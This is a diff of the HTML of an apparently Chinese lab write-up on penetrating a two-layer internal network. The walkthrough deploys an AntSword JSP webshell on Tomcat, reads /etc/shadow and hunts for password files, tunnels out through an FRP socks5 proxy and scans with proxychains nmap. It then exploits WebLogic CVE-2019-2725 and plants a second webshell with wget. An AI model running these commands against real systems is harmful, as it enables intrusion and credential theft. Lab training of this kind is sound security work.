@@ -672,11 +672,15 @@
 <h1 id="实验步骤三-构造和使用Webshell获得服务器访问权限"><a href="#实验步骤三-构造和使用Webshell获得服务器访问权限" class="headerlink" title="实验步骤三 &gt;&gt;&gt; 构造和使用Webshell获得服务器访问权限"></a>实验步骤三 &gt;&gt;&gt; 构造和使用Webshell获得服务器访问权限</h1><p>用蚁剑的jsp木马，制作生成包含jsp木马的ant.war包：<br><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  src="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/7.png"><br>deploy上去，木马路径在url&#x2F;ant&#x2F;ant.jsp<br>启动中国蚁剑连接webshell<br><img src="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/8.png"><br><img src="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/9.png"><br>拿到此服务器权限<br><img data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <h1 id="实验步骤四-服务器敏感信息收集"><a href="#实验步骤四-服务器敏感信息收集" class="headerlink" title="实验步骤四 &gt;&gt;&gt; 服务器敏感信息收集"></a>实验步骤四 &gt;&gt;&gt; 服务器敏感信息收集</h1><p>执行命令、查看文件，获取tomcat服务器信息，如：所在<code>IP</code>段、开放的服务、敏感信息等</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br><span class="line">ps -elf</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">ip addr
+ps -elf</code></pre>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>查看用户敏感信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">find / -name *pass* -<span class="built_in">type</span> f</span><br><span class="line">find / -name *admin* -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd
+<span class="hljs-built_in">cat</span> /etc/shadow
+find / -name *pass* -<span class="hljs-built_in">type</span> f
+find / -name *admin* -<span class="hljs-built_in">type</span> f</code></pre>
 
 
 
@@ -688,7 +692,8 @@
 <p>上传ladon64工具到tmp目录，判断内网存活主机<code>IP</code></p>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/14.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ladon64</span><br><span class="line">./ladon64 172.22.0.0/24 icmpscan</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x ladon64
+./ladon64 172.22.0.0/24 icmpscan</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/15.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
@@ -696,18 +701,28 @@
 <p>上传FRP相关工具文件到tomcat服务器的<code>/tmp</code>目录</p>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/16.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x frp*</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp
+<span class="hljs-built_in">chmod</span> +x frp*</code></pre>
 
 <p>修改frpc配置文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.1.1.119</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 5000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">[common]
+server_addr = 10.1.1.119
+server_port = 7000
+
+[socks5]
+<span class="hljs-built_in">type</span> = tcp
+plugin = socks5
+remote_port = 5000</code></pre>
 
 <p>在攻击机上运行<code>frps</code>服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop/frp	# 切换到frp工具目录</span><br><span class="line">./frps -c frps.ini		# 通过-c选项指定frps配置文件</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">cd /root/Desktop/frp	# 切换到frp工具目录
+./frps -c frps.ini		# 通过-c选项指定frps配置文件</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/17.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>在获得shell的Tomcat服务器上执行frpc客户端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./frpc -c frpc.ini		<span class="comment"># 通过-c选项指定frpc配置文件</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp
+./frpc -c frpc.ini		<span class="hljs-comment"># 通过-c选项指定frpc配置文件</span></code></pre>
 
 <p>建立连接之后，会创建一个<code>socks5</code>代理通道</p>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/18.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
@@ -717,7 +732,7 @@
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/19.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>在文件末尾注释掉默认有的<code>socks4</code>配置项，添加如下配置：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 5000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">socks5 127.0.0.1 5000</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/20.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
@@ -729,7 +744,11 @@
 <p>成功访问</p>
 <h1 id="实验步骤六-内网扫描发现内网服务"><a href="#实验步骤六-内网扫描发现内网服务" class="headerlink" title="实验步骤六 &gt;&gt;&gt; 内网扫描发现内网服务"></a>实验步骤六 &gt;&gt;&gt; 内网扫描发现内网服务</h1><p>通过socks代理通道，可以用外网的攻击机，访问到原本无法访问的目标内网主机，对内网进行攻击测试。</p>
 <p>通过socks代理工具，代理nmap流量到内网，对内网主机开放的端口进行扫描。<code>socks5</code>是无法代理<code>icmp</code>协议请求的，把<code>icmp</code>的请求禁止走我们建立的socks代理，来防止正常请求发送出错或无法发送。在nmap中使用<code>-Pn</code>选项：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -T4 172.22.0.20</span><br><span class="line"></span><br><span class="line">-Pn：禁ping</span><br><span class="line">-sT：tcp连接探测端口</span><br><span class="line">-T4：加快请求连接速度</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">proxychains nmap -Pn -sT -T4 172.22.0.20
+
+-Pn：禁ping
+-sT：tcp连接探测端口
+-T4：加快请求连接速度</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/23.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
@@ -740,17 +759,20 @@
 <p>配置代理后可访问到攻击机原本访问不到的内网<code>Weblogic</code>服务</p>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/25.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<h1 id="实验步骤七-远程命令执行漏洞利用"><a href="#实验步骤七-远程命令执行漏洞利用" class="headerlink" title="实验步骤七 &gt;&gt;&gt; 远程命令执行漏洞利用"></a>实验步骤七 &gt;&gt;&gt; 远程命令执行漏洞利用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/Desktop/weblogicscan</span><br><span class="line"><span class="built_in">cp</span> fake_useragent_0.1.11.json /tmp/</span><br><span class="line">proxychains python3 WeblogicScan.py -u 172.22.0.20 -p 7001</span><br></pre></td></tr></table></figure>
+<h1 id="实验步骤七-远程命令执行漏洞利用"><a href="#实验步骤七-远程命令执行漏洞利用" class="headerlink" title="实验步骤七 &gt;&gt;&gt; 远程命令执行漏洞利用"></a>实验步骤七 &gt;&gt;&gt; 远程命令执行漏洞利用</h1><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/Desktop/weblogicscan
+<span class="hljs-built_in">cp</span> fake_useragent_0.1.11.json /tmp/
+proxychains python3 WeblogicScan.py -u 172.22.0.20 -p 7001</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/26.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>有很多漏洞，这里利用CVE-2019-2725，因为桌面上刚好有这个脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/Desktop</span><br><span class="line">proxychains python3 weblogic-CVE-2019-2725.py 10.3.6 http://172.22.0.20:7001/ <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/Desktop
+proxychains python3 weblogic-CVE-2019-2725.py 10.3.6 http://172.22.0.20:7001/ <span class="hljs-built_in">whoami</span></code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/27.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <p>可以看到成功利用并执行命令，还是root权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 weblogic-CVE-2019-2725.py 10.3.6 http://172.22.0.20:7001/</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">proxychains python3 weblogic-CVE-2019-2725.py 10.3.6 http://172.22.0.20:7001/</code></pre>
 
 <p>上传webshell小马</p>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/28.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
@@ -759,10 +781,10 @@
 <p>通过利用<code>Weblogic</code>的远程命令执行漏洞上传的<code>Webshell</code>只能进行命令的执行，而无法通过中国蚁剑等<code>Webshell</code>管理工具做更多的操作，因此，我们需要上传一个蚁剑<code>Webshell</code></p>
 <p>使用蚁剑文件管理功能，进入<code>Tomcat</code>服务器<code>/usr/local/tomcat/webapps/ant/</code>目录，新建<code>ant.txt</code>文件，复制<code>ant.jsp</code>文件内容到<code>ant.txt</code>文件中</p>
 <p>因为<code>Tomcat</code>和<code>Weblogic</code>服务器在同一个网段，可以互相访问，在<code>Weblogic</code>服务器上可以通过如下<code>URL</code>访问<code>ant.txt</code>文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.22.0.10:8080/ant/ant.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">http://172.22.0.10:8080/ant/ant.txt</code></pre>
 
 <p>通过命令执行下载我们放在Tomcat服务器上的ant.txt文件到Weblogic网站目录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.22.0.20:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=wget http://172.22.0.10:8080/ant/ant.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ant.jsp</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">http://172.22.0.20:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=wget http://172.22.0.10:8080/ant/ant.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ant.jsp</code></pre>
 
 <p>给蚁剑配置代理</p>
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/29.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
@@ -771,7 +793,10 @@
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/30.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
 <h1 id="实验步骤八-攫取二层内网的敏感信息"><a href="#实验步骤八-攫取二层内网的敏感信息" class="headerlink" title="实验步骤八 &gt;&gt;&gt; 攫取二层内网的敏感信息"></a>实验步骤八 &gt;&gt;&gt; 攫取二层内网的敏感信息</h1><p>通过蚁剑工具连接<code>Webshell</code>后执行命令、查看文件，获取<code>WebLogic</code>服务器信息，如：所在<code>IP</code>段、开放的服务、敏感信息等</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami					# 查看当前用户权限</span><br><span class="line">ip addr					# 查看当前主机IP 172.26.0.20</span><br><span class="line">ps -elf					# 查看当前主机运行的服务</span><br><span class="line">find / -name *pass*		# 查找主机系统中包含pass字符的所有文件名</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">whoami					# 查看当前用户权限
+ip addr					# 查看当前主机IP 172.26.0.20
+ps -elf					# 查看当前主机运行的服务
+find / -name *pass*		# 查找主机系统中包含pass字符的所有文件名</code></pre>
 
 <p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/%E8%9A%81%E6%99%AF%E7%BD%91%E5%AE%89-%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98/31.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
@@ -780,7 +805,9 @@
